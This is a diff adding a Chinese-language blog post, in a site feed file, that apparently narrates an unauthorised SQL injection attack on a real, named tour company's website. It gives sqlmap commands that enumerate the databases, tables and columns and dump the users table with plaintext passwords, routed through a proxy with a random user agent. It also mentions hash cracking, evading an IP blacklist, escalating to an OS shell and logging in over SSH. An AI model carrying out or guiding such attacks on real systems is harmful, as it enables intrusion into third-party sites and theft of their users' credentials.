@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>sqlmap注入拿后台</title>
+      <link href="/2019/07/15/2019-07-15-sqlmap-1/"/>
+      <url>/2019/07/15/2019-07-15-sqlmap-1/</url>
+      
+        <content type="html"><![CDATA[<p><strong>本文总过程中无破坏性操作</strong><br>对于这种php的无防站，直接用sqlmap+msf就可以拿。<br>对于那些暴露参数的php站的可以直接拿库，刚刚随便找了个。<br>2019-07-16:被发现了。。ip被黑名单，于是换了个节点。。。还可以登录</p><a id="more"></a><h2 id="先找后台（这位老哥直接在右上角放了链接）"><a href="#先找后台（这位老哥直接在右上角放了链接）" class="headerlink" title="先找后台（这位老哥直接在右上角放了链接）"></a>先找后台（这位老哥直接在右上角放了链接）</h2><p><a href="http://hesselgravetours.com/event.php?tourID=1721" target="_blank" rel="noopener">http://hesselgravetours.com/event.php?tourID=1721</a></p><ul><li>check databases<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://****tours.com/event.php?tourID=1721 --dbs --proxy socks5://127.0.0.1:1080 --random-agent</span><br></pre></td></tr></table></figure></li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hessel-1.png" alt title>                </div>                <div class="image-caption"></div>            </figure><ul><li>check tables<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://****tours.com/event.php?tourID=1721 -D hesselgrave --tables --proxy socks5://127.0.0.1:1080 --random-agent</span><br></pre></td></tr></table></figure></li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hessel-2.png" alt title>                </div>                <div class="image-caption"></div>            </figure><ul><li>check columns<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://****tours.com/event.php?tourID=1721 -D hesselgrave -T users --columns --proxy socks5://127.0.0.1:1080 --random-agent</span><br></pre></td></tr></table></figure></li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hessel-3.png" alt title>                </div>                <div class="image-caption"></div>            </figure><ul><li>dump <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://****tours.com/event.php?tourID=1721 -D hesselgrave -T users -C username,userID,password,accesslevel --dump --proxy socks5://127.0.0.1:1080 --random-agent</span><br></pre></td></tr></table></figure></li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hessel-4.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>可见没经过加密。。<br>如果经过了简单加密的话（如mysql的md5(passwd)），就可以找个在线网站撞（比如<a href="https://www.cmd5.com/）" target="_blank" rel="noopener">https://www.cmd5.com/）</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hessel-5.JPG" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="后续不贴了。"><a href="#后续不贴了。" class="headerlink" title="后续不贴了。"></a>后续不贴了。</h2><p><strong>防御太低有好几种方法找到路进行提权</strong></p><ul><li>因为在前面已经得到系统是FreeBSD或者是其他linux，并且得到网站运行在的用户名是content，懂我意思吧</li><li>继续用sqlmap –os-shell提权，第一次没有找到上传点</li><li>后台找到这个admin/documents/clients_recordview.php</li></ul><h2 id="插-入-服-务-器"><a href="#插-入-服-务-器" class="headerlink" title="插 入 服 务 器"></a>插 入 服 务 器</h2><p>提示是：<br>ssh -o HostKeyAlgorithms=+ssh-dss <a href="mailto:content@hesselgravetours.com" target="_blank" rel="noopener">content@hesselgravetours.com</a></p><p>密码是<del><strong><strong>***</strong></strong></del><br>图片不贴了</p><h4 id="明天读一下"><a href="#明天读一下" class="headerlink" title="明天读一下"></a>明天读一下</h4><p><a href="https://arxiv.org/pdf/1502.01852.pdf" target="_blank" rel="noopener">https://arxiv.org/pdf/1502.01852.pdf</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Linux </tag>
+            
+            <tag> web </tag>
+            
+            <tag> sqlmap </tag>
+            
+            <tag> msf </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>部分MACOS风格的ubuntu</title>
       <link href="/2019/07/09/2019-07-09-%E6%88%91%E7%9A%84ubuntu%E8%AE%BE%E7%BD%AE%E7%95%8C%E9%9D%A2%E9%A3%8E%E6%A0%BC/"/>
       <url>/2019/07/09/2019-07-09-%E6%88%91%E7%9A%84ubuntu%E8%AE%BE%E7%BD%AE%E7%95%8C%E9%9D%A2%E9%A3%8E%E6%A0%BC/</url>
